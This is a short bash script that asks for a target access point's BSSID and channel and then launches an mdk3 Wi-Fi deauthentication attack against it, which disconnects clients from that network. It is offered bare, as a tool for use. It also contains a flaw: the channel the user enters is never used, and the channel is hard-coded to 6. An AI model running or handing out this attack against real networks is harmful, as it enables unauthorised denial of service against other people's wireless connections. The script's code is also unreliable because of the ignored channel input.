#!/bin/bash

echo ""
echo "Enter the target's BSSID"
read -r vBSSID
echo "Enter the target's channel"
read -r vChannel

echo $vBSSID > blacklist

sudo mdk3 wlan1mon d -b blacklist -c 6
